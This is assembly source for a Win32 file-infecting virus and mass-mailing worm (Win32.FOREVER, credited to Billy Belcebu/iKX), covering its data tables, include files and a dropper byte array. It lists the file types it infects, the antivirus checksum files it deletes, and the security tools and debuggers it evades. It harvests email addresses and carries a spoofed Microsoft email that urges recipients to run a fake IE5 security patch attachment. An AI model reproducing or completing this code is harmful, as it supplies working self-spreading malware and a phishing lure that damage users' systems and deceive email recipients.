   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Data that travel with the virus                                         %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   ; extension_table values:
   ;       BYTE    action_to_perform;
   ;       DWORD   extension (with dot).

   ; action_to_perform values:
   ;       01 - Infect PE file (EXE/SCR/CPL)
   ;       02 - Infect archive (RAR/ARJ/ZIP/CAB) or BAT
   ;       03 - Search for e-mail addresses in HTM? files
   ;       04 - Search for e-mail addresses in WAB files (Windows Address Book)

   extension_table =       $
                   db      01h,".exe"              ; Infect PE
                   db      01h,".scr"              ; Infect PE
                   db      01h,".cpl"              ; Infect PE
                   db      02h,".bat"              ; Infect BAT
                   db      02h,".rar"              ; Drop over RAR
                   db      02h,".arj"              ; Drop over ARJ
                   db      02h,".zip"              ; Drop over ZIP
                   db      02h,".cab"              ; Drop over CAB
                   db      03h,".htm"              ; Search for mail addresses
                   db      04h,".wab"              ; Search for mail addresses
                   db      0BBh

   ; This is the file mask to search for

           if      debug
   SEARCH_MASK     db      "GOAT???.*",0           ; Controlled spread :P
           else
   SEARCH_MASK     db      "GOAT???.*",0                 ; Total retaliation }:)
           endif
                   org     $-1                     ; Overlap rulez

   ; This is a little table with some names

   names           db      0
                   db      "William",0             ; William Gibson
                   db      "Brian",0               ; Brian Warner=Marilyn Manson
                   db      "Steve",0               ; Steve Harris (Iron Maiden)
                   db      "Matt",0                ; Matt Pietrek (g0d)
                   db      "Thomas",0              ; Thomas Anderson (Neo)
                   db      "James",0               ; James Hetfield (Metallica)
                   db      "Jeniffer",0            ; Jeniffer Lopez (mmmm...)
                   db      "Lisa",0                ; Lisa Simpson :)
                   org     $-1                     ; - kewl - hahahahah :)
   surnames        db      0
                   db      "Smith",0               ; There're a lot of this ones :)
                   db      "O'Leary",0             ; The guy that wrote PE desc.
                   db      "Anderson",0            ; Pamela Anderson (mmmm...)
                   db      "Herrera",0             ; Raymond Herrera (Fear Factory)
                   db      "Burton",0              ; Cliff Burton (Metallica-RIP)
                   db      "Case",0                ; As the guy in necromancer :)
                   db      "Lee",0                 ; Tommy Lee (pamela's fucker)
                   db      "Grissom",0             ; Cyrus Grissom (Con Air)

   TemporalFile    db      "C:\CHKLIST.IKX",0      ; Temporal file for our needs
   szTtl_          =       $-4

   Drivers2Avoid   =       $
                   db      "\\.\SICE",0            ; SoftICE for Win9x
                   db      "\\.\NTICE",0           ; SoftICE for WinNT
                   db      0BBh

   ; The virus will erase all this files in every directory

   Files2Kill      =       $
                   db      "CHKLIST.DAT",0
                   db      "CHKLIST.TAV",0
                   db      "CHKLIST.MS",0
                   db      "CHKLIST.CPS",0
                   db      "SMARTCHK.MS",0
                   db      "SMARTCHK.CPS",0
                   db      "ANTI-VIR.DAT",0
                   db      "AVP.CRC",0
                   db      "IVB.NTZ",0
                   db      "AGUARD.DAT",0
                   db      "AVGQT.DAT",0
                   db      "C:\FRAGILE.EXE",0      ; Just kill it manually
                   db      0BBh

   ; The virus won't infect the files with this characters

   Files2Avoid     =       $
                   db      02h,"TB"                ; ThunderByte?
                   db      02h,"F-"                ; F-Prot?
                   db      02h,"AV"                ; AVP? AVAST? AV*?
                   db      02h,"HL"                ; Half-Life?
                   db      03h,"NAV"               ; Norton Antivirus?
                   db      03h,"WEB"               ; DrWeb?
                   db      03h,"PAV"               ; Panda?
                   db      03h,"DRW"               ; DrWeb?
                   db      03h,"NOD"               ; Nod-Ice?
                   db      04h,"DSAV"              ; Dr Solomon?
                   db      04h,"TD32"              ; Turbo Debugger?
                   db      05h,"NTVDM"             ; NTVDM?
                   db      06h,"WINICE"            ; SoftIce?
                   db      06h,"SPIDER"            ; Spider?
                   db      06h,"DEFRAG"            ; Defrag?
                   db      06h,"TASM32"            ; Turbo Assembler?
                   db      07h,"TLINK32"           ; Turbo Link?
                   db      07h,"RUNONCE"           ; RunOnce?
                   db      07h,"SYSTRAY"           ; SysTray?
                   db      07h,"TASKMON"           ; TaskMon?
                   db      07h,"SPOOL32"           ; Spool32?
                   db      08h,"CLEANMGR"          ; CleanMgr?
                   db      08h,"SCANDSKW"          ; ScanDisk?
                   db      08h,"AUTOEXEC"          ; AUTOEXEC.BAT?
                   db      08h,"RUNDLL32"          ; RunDll32?
                   db      0BBh

   ; Here come the VxDCalls we must fix

   VxD_fix         =       $
                   dd      offset (@@fx1),VXDLDR_GetDeviceList
                   dd      offset (@@fx2),VMM_Get_DDB
                   dd      offset (@@fx3),VMM_PageQuery
   n_VxD_fix       =       ($-VxD_fix)/8


   ; Here comes the "import" table of the virus ;)

   api_list        =       $
                         ; db      "KERNEL32",0    ; Don't needed
   @VirtualProtect         dd      079C3D4BBh      ; 01
   @FindFirstFileA         dd      0AE17EBEFh      ; 02
   @FindNextFileA          dd      0AA700106h      ; 03
   @FindClose              dd      0C200BE21h      ; 04
   @CreateFileA            dd      08C892DDFh      ; 05
   @GetFileAttributesA     dd      0C633D3DEh      ; 06
   @SetFileAttributesA     dd      03C19E536h      ; 07
   @CloseHandle            dd      068624A9Dh      ; 08
   @GetCurrentDirectoryA   dd      0EBC6C18Bh      ; 09
   @SetCurrentDirectoryA   dd      0B2DBD7DCh      ; 00
   @GetWindowsDirectoryA   dd      0FE248274h      ; 11
   @GetSystemDirectoryA    dd      0593AE7CEh      ; 12
   @CreateFileMappingA     dd      096B2D96Ch      ; 13
   @MapViewOfFile          dd      0797B49ECh      ; 14
   @UnmapViewOfFile        dd      094524B42h      ; 15
   @SetEndOfFile           dd      059994ED6h      ; 16
   @GetFileSize            dd      0EF7D811Bh      ; 17
   @SetFilePointer         dd      085859D42h      ; 18
   @CreateThread           dd      019F33607h      ; 19
   @WaitForSingleObject    dd      0D4540229h      ; 20
   @ExitThread             dd      0058F9201h      ; 21
   @TerminateThread        dd      08BDFBA40h      ; 22
   @SetThreadPriority      dd      03B58B409h      ; 23
   @GetSystemTime          dd      075B7EBE8h      ; 24
   @GetDriveTypeA          dd      0B99F1B1Eh      ; 25
   @GetTickCount           dd      0613FD7BAh      ; 26
   @DeleteFileA            dd      0DE256FDEh      ; 27
   @LoadLibraryA           dd      04134D1ADh      ; 28
   @FreeLibrary            dd      0AFDF191Fh      ; 29
   @GlobalAlloc            dd      083A353C3h      ; 30
   @GlobalFree             dd      05CDF6B6Ah      ; 31
   @WriteFile              dd      021777793h      ; 32
   @lstrcat                dd      00792195Bh      ; 33
   @CopyFileA              dd      05BD05DB1h      ; 34
   @RegisterServiceProcess dd      05F31BC8Eh      ; 35
   @Sleep                  dd      00AC136BAh      ; 36
   @ReadFile               dd      054D8615Ah      ; 37
   @GetProcAddress         dd      0FFC97C1Fh      ; 38
   @CreateMutexA           dd      020B943E7h      ; 39
   @GetLastError           dd      087D52C94h      ; 40
   @GetModuleFileNameA     dd      004DCF392h      ; 41
   @IsDebuggerPresent      dd      052E3BEB1h      ; 42
                           db      0BBh

                           if      debug
                           db      "USER32",0
   @MessageBoxA            dd      0D8556CF7h
                           db      0BBh
                           endif

                           db      "ADVAPI32",0
   @RegCreateKeyExA        dd      02C822198h
   @RegSetValueExA         dd      05B9EC9C6h
   @RegOpenKeyExA          dd      0CD195699h
   @RegQueryValueExA       dd      088B7093Bh
   @RegCloseKey            dd      0841802AFh
                           db      0BBh

                           db      "WSOCK32",0
   @WSAStartup             dd      0BBA4D88Fh
   @WSACleanup             dd      0105B23B2h
   @recv                   dd      07A3CE88Ah
   @send                   dd      0377022BAh
   @socket                 dd      08EB460E1h
   @closesocket            dd      01CC6CDC5h
   @connect                dd      05F7E2D81h
   @htons                  dd      07C2941D1h
   @gethostname            dd      0A760D661h
   @gethostbyname          dd      0EAED580Ch
                           db      0BBh

                           db      "WININET",0
   @InternetGetConnectedState dd   0DB46465Ah
                           db      0BBh

                           db      "IMAGEHLP",0
   @CheckSumMappedFile     dd      078B31744h
                           db      0BBh

                           db      "SFC",0
   @SfcIsFileProtected     dd      06DE8F7ABh
                           db      0BBh

   ; That's the end, my friend...

                           db      ""             ; PISTO FOR MINISTRO

   ; Some worm-part datas

   szToSend        =       $
                   dd      offset szHelo
                   dd      offset szMailFrom
                   dd      offset szRcptTo
   nToSend         =       ($-szToSend)/4

   ; client commands

   szHelo          db      "HELO microsoft.com",13,10,0
   szMailFrom      db      "MAIL FROM: support@microsoft.com",13,10,0
   szRcptTo        db      "RCPT TO: "
   emilio          db      128 dup (00h)           ; I think it's enough :)
   szData          db      "DATA",13,10,0

   ; more client commands, but with  another treatment :)

   szEndOfMail     db      13,10,".",13,10,0
   szQuit          db      "QUIT",13,10,0

   ; header of e-mail

   message_body1   =       $
   szFrom          db      "FROM:"
   szNameFrom      db      "silly name       <support@microsoft.com>",13,10
   szSubject       db      "SUBJECT:"
                   db      "Fix security problems with Internet Explorer 5 suite",13,10

   szMailText      db      "MIME-Version: 1.0",13,10
                   db      "Message-ID: <a1234>",13,10
                   db      'Content-Type: multipart/mixed; boundary="a1234"',13,10,13,10
                   db      "--a1234",13,10
                   db      "Content-Type: text/plain; charset=us-ascii",13,10
                   db      "Content-Transfer-Encoding: 7bit",13,10,13,10
                   db      "Dear Internet Explorer 5 suite user:",10,10
                   db      "We've just discovered a new security hole in our Microsoft "
                   db      "Internet Explorer 5 suite. It could be used by hackers to penetrate "
                   db      "your system, so we strongly recommend you to download the "
                   db      "security patch from http://support.microsoft.com/ie5patch.asp "
                   db      "or just execute the file attached to this e-mail. "
                   db      "It will provide you protection againist internet worms like "
                   db      "I LOVE YOU (VBS.LoveLetter) and mutations of it.",13,10,13,10
                   db      "Our best regards,",13,10
                   db      "Microsoft Development Team.",13,10
                   db      "--a1234",13,10
                   db      'Content-Type: application/octet-stream; name="IE5PATCH.EXE"',13,10
                   db      "Content-Transfer-Encoding: base64",13,10
                   db      'Content-Disposition: attachment; filename="IE5PATCH.EXE"',13,10,13,10
   message_size1   =       $-message_body1

   message_body2   db      10,'--a1234--',13,10,13,10
   message_size2   =       $-message_body2

   ; Some SMTP servers from spain

   SMTPServers     =       $
                   dd      offset szRelay1
                   dd      offset szRelay2

   szRelay1        db      "smtp.ctv.es",0
   szRelay2        db      "mailhost.teleline.es",0

   ; RAR Header

   RARHeader               label   byte
   RARHeaderCRC            dw      ?
   RARType                 db      74h
   RARFlags                dw      8000h
   RARHeadsize             dw      sRARHeaderSize
   RARCompressed           dd      ?
   RAROriginal             dd      ?
   RAROs                   db      ?
   RARCrc32                dd      ?
   RARFileTime             dw      arc_mark
   RARFileDate             db      31h,24h
   RARNeedVer              db      14h
   RARMethod               db      30h
   RARFnameSize            dw      sRARNameSize
   RARAttrib               dd      ?
   RARName                 db      "??????.EXE"
   sRARHeaderSize          equ     ($-offset RARHeader)
   sRARNameSize            equ     ($-offset RARName)

   ; ARJ Header

   ARJHeader               label   byte
   ARJSig                  db      60h,0EAh
   ARJHeadsiz              dw      2Ah
   ARJHSmsize              db      1Eh
   ARJVer                  db      07h
   ARJMin                  db      01h
   ARJHost                 db      ?
   ARJFlags                db      10h
   ARJMethod               db      ?
   ARJFiletype             db      ?
   ARJReserved             db      "Z"
   ARJFileTime             dw      arc_mark
   ARJFileDate             db      031h,024h
   ARJCompress             dd      ?
   ARJOriginal             dd      ?
   ARJCRC32                dd      ?
   ARJEntryName            dw      ?
   ARJAttribute            dw      ?
   ARJHostData             dw      ?
   sARJHeader              equ     ($-offset ARJHeader)

   ARJSecondSide           label   byte
   ARJFilename             db      "??????.EXE",0
   ARJComment              db      ?
   sARJCRC32Size           equ     ($-offset ARJHSmsize)
   ARJHeaderCRC            dd      ?
   ARJExtended             dw      ?
   sARJSecondSide          equ     ($-offset ARJSecondSide)
   sARJTotalSize           equ     ($-offset ARJSig)

   ; CAB Header

   CABHeader               label   byte
   CABMagic                db      "MSCF"
   CABReserved1            dd      ?
   CABFileSize             dd      ?
   CABReserved2            dd      ?
   CABFirstRec             dd      ?
   CABReserved3            dd      ?
   CABVersionMin           db      ?
   CABVersionMaj           db      ?
   CABnFolders             dw      ?
   CABnFiles               dw      ?
   CABFlags                dw      ?
   CABID                   dw      ?
   CABNumber               dw      ?

   CAB_Reserved            label   byte
   CABlength               dw      ?
   CABreserved             =       $

   CABdirectory_start      label   byte
   CABFirstRec_            dd      ?
   CABnData                dw      ?
   CABCompress             dw      ?
   CABReserved             =       $

   CABfile_start           label   byte
   CABUnCompSize           dd      ?               ; Tama¤o dropper
   CABFileStart            dd      ?
   CABFlags_               dw      ?
   CABDate                 db      031h,024h
   CABTime                 dw      arc_mark
   CABAttribs              dw      0020h
   CABFileName             db      "????????.EXE",0

   CABentry                label   byte
   CABCRC                  dd      ?
   CABCompr                dw      ?               ; Tama¤o dropper
   CABUnCompr              dw      ?               ; Tama¤o dropper
   CABCompr_data           =       $
   CABHeaderSize2          =       $-CABdirectory_start

   comment þ

   ; ZIP Header

   ; Central header

   ZIPRHeaderId            db      "PK"
   ZIPRSignature           db      1,2
   ZIPRVerMade             dw      10d
   ZIPRVerNeed             dw      0ah
   ZIPRFlags               dw      ?
   ZIPRMethod              dw      ?
   ZIPRTime                dw      arc_mark

   ZIPRDate                db      031h,024h
   ZIPRCRC32               dd      ?
   ZIPRCompressed          dd      ?                       ; !!!
   ZIPRUncompressed        dd      ?                       ; !!!
   ZIPRSizeFilename        dw      ZIPRNameLenght
   ZIPRExtraField          dw      ?
   ZIPRCommentSize         dw      ?
   ZIPRDiskNumber          dw      ?
   ZIPRInternalAttr        dw      1
   ZIPRExternalAttr        dd      21h
   ZIPROffsetLHeaderR      dd      ?
   ZIPRFilename            db      "??????.EXE"
   ZIPRNameLenght          =       $-ZIPRFilename
   ZIPRHeaderSize          =       $-ZIPRHeaderId

   ; Local header

   ZIPLHeaderId            db      "PK"
   ZIPLSignature           db      3,4
   ZIPLVersionNeed         dw      0010d
   ZIPLFlags               dw      80h
   ZIPLMethod              dw      ?
   ZIPLTime                dw      arc_mark
   ZIPLDate                db      031h,024h
   ZIPLCRC32               dd      ?
   ZIPLCompressed          dd      ?                       ; !!!
   ZIPLUncompressed        dd      ?                       ; !!!
   ZIPLSizeFilename        dw      ZIPLNameLenght
   ZIPLExtraField          dw      ?
   ZIPLFilename            db      "??????.EXE"
   ZIPLNameLenght          =       $-ZIPLFilename



   ZIPReadBuffer           label   byte
   ZIPEHeaderId            db      "PK"
   ZIPSignature            dw      ?
   ZIPNoDisk               dw      ?
   ZIPNoStartDisk          dw      ?
   ZIPEntryDisk            dw      ?
   ZIPEntrysDir            dw      ?
   ZIPSizeDir              dd      ?
   ZIPOffsetDir            dd      ?
   ZIPCommentLenght        dw      ?
   ZIPEHeaderSize          =       $-ZIPEHeaderId

           þ

           if      (($-virus_start) mod 4) gt 0    ; Pad size to dwordz
           db      (4 - (($-virus_start) mod 4)) dup (00h) ; Thnx to T2 4 this :)
           endif

   virus_end       =       $

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Data in the heap                                                        %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

           include mmxedata.inc

   ; running_os values:
   ;       00 - Win9x
   ;       01 - WinNT
   ;       02 - Win2k
   ;       03 - WinMe
   ;       04 - Other place (maybe a beta?)

   running_os      db      ?

   ; SoftICE values
   ;       00 - No SoftICE working
   ;       01 - Detected SoftICE for Win9x or WinNT

   SoftICE         db      ?

   ; Miscellaneous data

   kernel          dd      ?

   random_seed     =       $
   rnd_seed1       dd      ?
   rnd_seed2       dd      ?
   rnd_seed3       dd      ?
                   dd      ?

   ArchiveBuffer   db      50d dup (?)
   SMTPName        db      30d dup (?)
   normal_mail     db      80d dup (?)
   recv_data       db      50d dup (?)

   wsad            WSADATA <?>
   saddr           SOCKADDR <?>

   SMTPNamePtr     dd      ?
   DropperSize     dd      ?
   OriginalSize    dd      ?
   Disposition     dd      ?
   RegHandle       dd      ?
   GlobalAllocHnd  dd      ?
   GlobalAllocHnd2 dd      ?
   NumBytesRead    dd      ?
   iobytes         dq      ?,?
   unit            dd      ?
   TSHandle        dd      ?
   AddressTableVA  dd      ?
   NameTableVA     dd      ?
   OrdinalTableVA  dd      ?
   SearchHandle    dd      ?
   TmpModuleBase   dd      ?
   FileHandle      dd      ?
   MapHandle       dd      ?
   MapAddress      dd      ?
   NewSize         dd      ?
   FS_CAB          dd      ?
   FHS_CAB         dd      ?
   FLD_CAB         dd      ?
   ThreadHandle    dd      ?
   MimePtr         dd      ?
   MemPtr          dd      ?
   MimeSize        dd      ?
   SocketHandle    dd      ?
   temp_buffer     dd      ?

   ; Some shit :)

   current_dir     db      MAX_PATH dup (?)
   infect_dir      db      MAX_PATH dup (?)
   temp_dir        db      MAX_PATH dup (?)
   HostName        db      MAX_PATH dup (?)

   ; KERNEL32 APIs
   api_addresses   =       $
   VirtualProtect          dd      ?
   FindFirstFileA          dd      ?
   FindNextFileA           dd      ?
   FindClose               dd      ?
   CreateFileA             dd      ?
   GetFileAttributesA      dd      ?
   SetFileAttributesA      dd      ?
   CloseHandle             dd      ?
   GetCurrentDirectoryA    dd      ?
   SetCurrentDirectoryA    dd      ?
   GetWindowsDirectoryA    dd      ?
   GetSystemDirectoryA     dd      ?
   CreateFileMappingA      dd      ?
   MapViewOfFile           dd      ?
   UnmapViewOfFile         dd      ?
   SetEndOfFile            dd      ?
   GetFileSize             dd      ?
   SetFilePointer          dd      ?
   CreateThread            dd      ?
   WaitForSingleObject     dd      ?
   ExitThread              dd      ?
   TerminateThread         dd      ?
   SetThreadPriority       dd      ?
   GetSystemTime           dd      ?
   GetDriveTypeA           dd      ?
   GetTickCount            dd      ?
   DeleteFileA             dd      ?
   LoadLibraryA            dd      ?
   FreeLibrary             dd      ?
   GlobalAlloc             dd      ?
   GlobalFree              dd      ?
   WriteFile               dd      ?
   lstrcat                 dd      ?
   CopyFileA               dd      ?
   RegisterServiceProcess  dd      ?
   Sleep                   dd      ?
   ReadFile                dd      ?
   GetProcAddress          dd      ?
   CreateMutexA            dd      ?
   GetLastError            dd      ?
   GetModuleFileNameA      dd      ?
   IsDebuggerPresent       dd      ?

   ; USER32 APIs
                           if      debug
   MessageBoxA_            dd      ?
                           endif
   ; ADVAPI32 APIs
   RegCreateKeyExA         dd      ?
   RegSetValueExA          dd      ?
   RegOpenKeyExA           dd      ?
   RegQueryValueExA        dd      ?
   RegCloseKey             dd      ?

   ; WSOCK32 APIs
   WSAStartup              dd      ?
   WSACleanup              dd      ?
   recv                    dd      ?
   send                    dd      ?
   socket                  dd      ?
   closesocket             dd      ?
   connect                 dd      ?
   htons                   dd      ?
   gethostname             dd      ?
   gethostbyname           dd      ?

   ; WININET APIs
   InternetGetConnectedState dd    ?

   ; IMAGEHLP APIs
   CheckSumMappedFile      dd      ?

   ; SFC APIs
   SfcIsFileProtected      dd      ?

   ; For normal FindFirst/FindNext

   WIN32_FIND_DATA         label   byte
   WFD_dwFileAttributes    dd      ?
   WFD_ftCreationTime      dq      ?
   WFD_ftLastAccessTime    dq      ?
   WFD_ftLastWriteTime     dq      ?
   WFD_nFileSizeHigh       dd      ?
   WFD_nFileSizeLow        dd      ?
   WFD_dwReserved0         dd      ?
   WFD_dwReserved1         dd      ?
   WFD_szFileName          db      MAX_PATH dup (?)
   WFD_szAlternateFileName db      13 dup (?)
               db      03 dup (?)
   WFD_Size                =       $-WIN32_FIND_DATA

   ; For recursive directory scanning

   _WIN32_FIND_DATA        label   byte
   _WFD_dwFileAttributes   dd      ?
   _WFD_ftCreationTime     dq      ?
   _WFD_ftLastAccessTime   dq      ?
   _WFD_ftLastWriteTime    dq      ?
   _WFD_nFileSizeHigh      dd      ?
   _WFD_nFileSizeLow       dd      ?
   _WFD_dwReserved0        dd      ?
   _WFD_dwReserved1        dd      ?
   _WFD_szFileName         db      MAX_PATH dup (?)
   _WFD_szAlternateFileName db     13 dup (?)
                           db      03 dup (?)

   heap_end        =       $

           end     _1stgencode

   ;------------------------------[ FOREVER.INC ]------------------------------;

   ;############################################################################
   ;# WIN32.FOREVER - INC FILE                 (c) 1999-2000 Billy Belcebu/iKX #
   ;############################################################################

   ; Boolean things ;)

   false           =       0
   true            =       1

   ; Marks for infected files

   inf_mark        =       "!XKi"
   arc_mark        =       "BB"

   ; Day of activation of the payload

   pay_month       =       10d
   pay_date        =       26d

   ; Some hardcoded addresses (not really needed at all)

   kernel_w9x      =       0BFF70000h
   kernel_wMe      =       0BFF60000h
   kernel_wNT      =       077F00000h
   kernel_w2k      =       077E80000h

   ; Some switches for know under what OS we are

   running_w9x     =       00h
   running_wNT     =       01h
   running_w2k     =       02h
   running_unk     =       03h

   ; Interrupt for jump to Ring-0

           if      debug
   interrupt       =       05h
           else
   interrupt       =       03h
           endif

   ; Some PE header fields

   i386_machine    =       014Ch
   SizeOfSectHeader=       28h
   SizeOfSectTable =       0F8h
   RWX_attributes  =       0A0000020h

   ; Stack positions of registers after a PUSHAD

   PUSHAD_EDI      =       00h
   PUSHAD_ESI      =       04h
   PUSHAD_EBP      =       08h
   PUSHAD_ESP      =       0Ch
   PUSHAD_EBX      =       10h
   PUSHAD_EDX      =       14h
   PUSHAD_ECX      =       18h
   PUSHAD_EAX      =       1Ch

   ; These are the kind of drives where we can spread ourselves

   DriveFixed      =       03h
   DriveRemote     =       04h

   ; Some tipical constants

   virus_size      =       virus_end-virus_start
   virus_pages     =       ((virus_size+0FFFh)/1000h)
   heap_size       =       heap_end-virus_end
   total_size      =       virus_size+heap_size

   ; Some PE header stuff

   MagicPE         =       00h
   Machine         =       04h
   NumberOfSections=       06h
   EntrypointRVA   =       28h
   CodeRVA         =       2Ch
   FileAlignment   =       3Ch
   MagicInfection  =       4Ch
   SizeOfImage     =       50h
   CheckSum        =       58h
   PECharacteristics=      5Eh
   DirEntryReloc   =       0A0h

   ; Some section header fields

   SectionName     =       00h
   VirtualSize     =       08h
   VirtualAddress  =       0Ch
   SizeOfRawData   =       10h
   PtrToRawData    =       14h
   PtrToReloc      =       18h
   NumOfReloc      =       20h
   Characteristics =       24h

   ; Other thingies

   NoSoftICE       =       00h
   MAX_PATH        =       104h
   RetAddress      =       20h

   ; Some used VxDCalls :)

   VXDLDR_GetDeviceList    =       00270005h
   VMM_Get_DDB             =       00010146h
   VMM_PageQuery           =       00010134h

   ; WINSOCK structures needed

   WSADATA     struct
   mVersion        dw      ?
   mHighVersion    dw      ?
   szDescription   db      257 dup(?)
   szSystemStatus  db      129 dup(?)
   iMaxSockets     dw      ?
   iMaxUpdDg       dw      ?
   lpVendorInfo    dd      ?
   WSADATA     ends

   SOCKADDR        struct
   sin_family      dw      ?
   sin_port        dw      ?
   sin_addr        dd      ?
   sin_zero        db      8 dup(?)
   SOCKADDR        ends

   HOSTENT         struc
   h_name          dd      ?
   h_aliases       dd      ?
   h_addrtype      dw      ?
   h_lenght        dw      ?
   h_addr_list     dd      ?
   h_ip            dd      ?
   HOSTENT         ends

   ; Some macros

   VxDCall         macro   Service
                   int     20h
                   dd      Service
                   endm

   VxDJmp          macro   Service
                   VxDCall Service+8000h
                   endm

   apicall         macro   Api
                   call    dword ptr [ebp+Api]
                   endm

   ; These functions are similar to Jacky Qwerty's

   pushs           macro   String
                   local   korn
                   call    korn
                   db      String,00h
             korn:
                   endm

   pSEH            macro   HandlerSEH
                   local   shit
                   call    shit
                   mov     esp,[esp+08h]
                   HandlerSEH
             shit: xor     edx,edx
                   push    dword ptr fs:[edx]
                   mov     dword ptr fs:[edx],esp
                   endm

   rSEH            macro
                   xor     edx,edx
                   pop     dword ptr fs:[edx]
                   pop     edx
                   endm

   ;------------------------------[ DROPPER.INC ]------------------------------;

   ;############################################################################
   ;# WIN32.FOREVER - INC FILE (DROPPER)            (c) 1999 Billy Belcebu/iKX #
   ;############################################################################

   ; This is the dropper of a LSCE compressed PE EXE, with the following code:

   ;        .386
   ;        .model flat,stdcall
   ;
   ; extrn  ExitProcess:PROC
   ;
   ;        .data
   ;
   ;        db     0
   ;
   ;        .code
   ;
   ; start:
   ;        call   ExitProcess,0
   ; end    start
   ;
   ; And a self-extracting icon :)

   dr0p:
           db      04Dh, 05Ah, 050h, 000h, 001h, 000h, 002h, 000h
           db      003h, 000h, 004h, 000h, 001h, 000h, 00Fh, 000h
           db      001h, 000h, 0FFh, 0FFh, 000h, 002h, 000h, 0B8h
           db      000h, 007h, 000h, 040h, 000h, 001h, 000h, 01Ah
           db      000h, 022h, 000h, 001h, 000h, 002h, 000h, 0BAh
           db      010h, 000h, 001h, 000h, 00Eh, 01Fh, 0B4h, 009h
           db      0CDh, 021h, 0B8h, 001h, 04Ch, 0CDh, 021h, 090h
           db      090h, 054h, 068h, 069h, 073h, 020h, 070h, 072h
           db      06Fh, 067h, 072h, 061h, 06Dh, 020h, 06Dh, 075h
           db      073h, 074h, 020h, 062h, 065h, 020h, 072h, 075h
           db      06Eh, 020h, 075h, 06Eh, 064h, 065h, 072h, 020h
           db      057h, 069h, 06Eh, 033h, 032h, 00Dh, 00Ah, 024h
           db      037h, 000h, 088h, 000h, 050h, 045h, 000h, 002h
           db      000h, 04Ch, 001h, 005h, 000h, 001h, 000h, 091h
           db      028h, 0E0h, 0B6h, 000h, 008h, 000h, 0E0h, 000h
           db      001h, 000h, 08Eh, 081h, 00Bh, 001h, 002h, 019h
           db      000h, 001h, 000h, 002h, 000h, 003h, 000h, 00Ah
           db      000h, 007h, 000h, 010h, 000h, 003h, 000h, 010h
           db      000h, 003h, 000h, 020h, 000h, 004h, 000h, 040h
           db      000h, 002h, 000h, 010h, 000h, 003h, 000h, 002h
           db      000h, 002h, 000h, 001h, 000h, 007h, 000h, 003h
           db      000h, 001h, 000h, 00Ah, 000h, 006h, 000h, 060h
           db      000h, 003h, 000h, 004h, 000h, 006h, 000h, 002h
           db      000h, 005h, 000h, 010h, 000h, 002h, 000h, 020h
           db      000h, 004h, 000h, 010h, 000h, 002h, 000h, 010h
           db      000h, 006h, 000h, 010h, 000h, 00Ch, 000h, 030h
           db      000h, 002h, 000h, 054h, 000h, 004h, 000h, 050h
           db      000h, 003h, 000h, 006h, 000h, 013h, 000h, 040h
           db      000h, 002h, 000h, 00Ch, 000h, 053h, 000h, 043h
           db      04Fh, 044h, 045h, 000h, 005h, 000h, 010h, 000h
           db      003h, 000h, 010h, 000h, 003h, 000h, 002h, 000h
           db      003h, 000h, 006h, 000h, 00Eh, 000h, 020h, 000h
           db      002h, 000h, 0E0h, 044h, 041h, 054h, 041h, 000h
           db      005h, 000h, 010h, 000h, 003h, 000h, 020h, 000h
           db      007h, 000h, 008h, 000h, 00Eh, 000h, 040h, 000h
           db      002h, 000h, 0C0h, 02Eh, 069h, 064h, 061h, 074h
           db      061h, 000h, 003h, 000h, 010h, 000h, 003h, 000h
           db      030h, 000h, 003h, 000h, 002h, 000h, 003h, 000h
           db      008h, 000h, 00Eh, 000h, 040h, 000h, 002h, 000h
           db      0C0h, 02Eh, 072h, 065h, 06Ch, 06Fh, 063h, 000h
           db      003h, 000h, 010h, 000h, 003h, 000h, 040h, 000h
           db      003h, 000h, 002h, 000h, 003h, 000h, 00Ah, 000h
           db      00Eh, 000h, 040h, 000h, 002h, 000h, 050h, 02Eh
           db      072h, 073h, 072h, 063h, 000h, 004h, 000h, 010h
           db      000h, 003h, 000h, 050h, 000h, 003h, 000h, 006h
           db      000h, 003h, 000h, 00Ch, 000h, 00Eh, 000h, 040h
           db      000h, 002h, 000h, 050h, 000h, 040h, 003h, 06Ah
           db      000h, 001h, 000h, 0E8h, 000h, 004h, 000h, 0FFh
           db      025h, 030h, 030h, 040h, 000h, 0F4h, 001h, 028h
           db      030h, 000h, 00Ah, 000h, 038h, 030h, 000h, 002h
           db      000h, 030h, 030h, 000h, 016h, 000h, 046h, 030h
           db      000h, 006h, 000h, 046h, 030h, 000h, 006h, 000h
           db      04Bh, 045h, 052h, 04Eh, 045h, 04Ch, 033h, 032h
           db      02Eh, 064h, 06Ch, 06Ch, 000h, 004h, 000h, 045h
           db      078h, 069h, 074h, 050h, 072h, 06Fh, 063h, 065h
           db      073h, 073h, 000h, 0AEh, 001h, 010h, 000h, 002h
           db      000h, 00Ch, 000h, 003h, 000h, 009h, 030h, 000h
           db      0FAh, 001h, 004h, 05Eh, 0FBh, 038h, 000h, 006h
           db      000h, 002h, 000h, 001h, 000h, 003h, 000h, 003h
           db      000h, 020h, 000h, 002h, 000h, 080h, 00Eh, 000h
           db      003h, 000h, 040h, 000h, 002h, 000h, 080h, 000h
           db      004h, 000h, 004h, 05Eh, 0FBh, 038h, 000h, 006h
           db      000h, 002h, 000h, 001h, 000h, 001h, 000h, 003h
           db      000h, 058h, 000h, 002h, 000h, 080h, 002h, 000h
           db      003h, 000h, 070h, 000h, 002h, 000h, 080h, 000h
           db      004h, 000h, 004h, 05Eh, 0FBh, 038h, 000h, 006h
           db      000h, 001h, 000h, 001h, 000h, 09Ah, 002h, 000h
           db      002h, 000h, 088h, 000h, 002h, 000h, 080h, 000h
           db      004h, 000h, 004h, 05Eh, 0FBh, 038h, 000h, 006h
           db      000h, 001h, 000h, 005h, 000h, 0A0h, 000h, 007h
           db      000h, 004h, 05Eh, 0FBh, 038h, 000h, 006h, 000h
           db      001h, 000h, 005h, 000h, 0B0h, 000h, 007h, 000h
           db      004h, 05Eh, 0FBh, 038h, 000h, 006h, 000h, 001h
           db      000h, 005h, 000h, 0C0h, 000h, 003h, 000h, 0D0h
